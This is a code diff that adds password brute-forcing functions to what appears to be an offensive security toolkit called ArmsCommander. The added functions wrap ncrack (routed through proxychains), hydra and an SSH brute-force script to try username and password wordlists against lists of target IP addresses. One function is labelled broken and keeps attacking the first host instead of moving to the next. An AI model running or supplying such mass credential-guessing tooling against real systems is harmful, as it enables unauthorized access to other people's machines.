@@ -136,3 +136,53 @@ def erase_finished_file_off_wordlist():
                 sentence.replace(sentence,'Wordlist entry deleted at: %s') % timestr # deletes the line to prevent it from being repeaterd by the iterator
     w.close()
     return
+
+# ncrack commands has invalid charcter error not much help online so we are switching to hydra
+def ncrack_ip_list(username_list, password_list, ip_list, port):
+    timestr = time.strftime("%Y%m%d-%H%M%S")
+    cmd_String = "sudo proxychains ncrack -U %s -P %s -T 5 -iL %s -p %s -oN /root/ArmsCommander/logs/ncrack/%s.txt" % (username_list, password_list, ip_list, port, timestr)
+    os.system(cmd_String)
+    return
+
+def hydra_ip_list(username_list, password_list, ip_list, protocol):
+    cmd_String = "hydra -L %s -P %s -M %s %s" % (username_list, password_list, ip_list, protocol)
+    print colored(cmd_String,'yellow',attrs=['bold'])
+    os.system(cmd_String)
+    return
+
+def ssh_brute_forcer(IP_wordlist, password_wordlist):
+    r = open(IP_wordlist, 'r')
+    username = str(raw_input("Enter a USERNAME like 'Admin' or 'Administrator' or 'root': "))
+    with open(IP_wordlist, 'r') as r:
+        line = r.readline().strip()
+        sentence = str(line)
+        for sentence in r:
+            host = sentence
+            cmd_String = "python /root/ArmsCommander/passwordattacks/sshBrute.py -H %s -u %s -F %s" % (host, username, password_wordlist)
+            cmd_String = cmd_String.replace('\n','')
+            print colored('Now brute forcing passwords against TARGET: %s, USERNAME: %s, PASSWORD WORDLIST: %s','yellow',attrs=['bold']) % (host, username, password_wordlist)
+            os.system(cmd_String)
+            print colored(cmd_String,'red',attrs=['bold'])
+    return
+
+def broken_ssh_brute_forcer(IP_wordlist, user_wordlist, password_wordlist): # moved toe password_toolkits
+# broken wont go to next IP
+
+    r = open(IP_wordlist, 'r')
+    u = open(user_wordlist, 'r')
+    with open(IP_wordlist, 'r') as r:
+    # while True:
+        line = r.readline().strip()
+        sentence = str(line)
+        for sentence in r:
+            with open(user_wordlist, 'r'):
+                u_line = u.readline().strip()
+                username = str(u_line)
+                for username in u:
+                    host = line
+                    cmd_String = "python /root/ArmsCommander/passwordattacks/sshBrute.py -H %s -u %s -F %s" % (host, username, password_wordlist)
+                    cmd_String = cmd_String.replace('\n','')
+                    print colored('Now brute forcing passwords against TARGET: %s, USERNAME: %s, PASSWORD WORDLIST: %s','yellow',attrs=['bold']) % (host, username, password_wordlist)
+                    os.system(cmd_String)
+                    print colored(cmd_String,'red',attrs=['bold'])
+    return
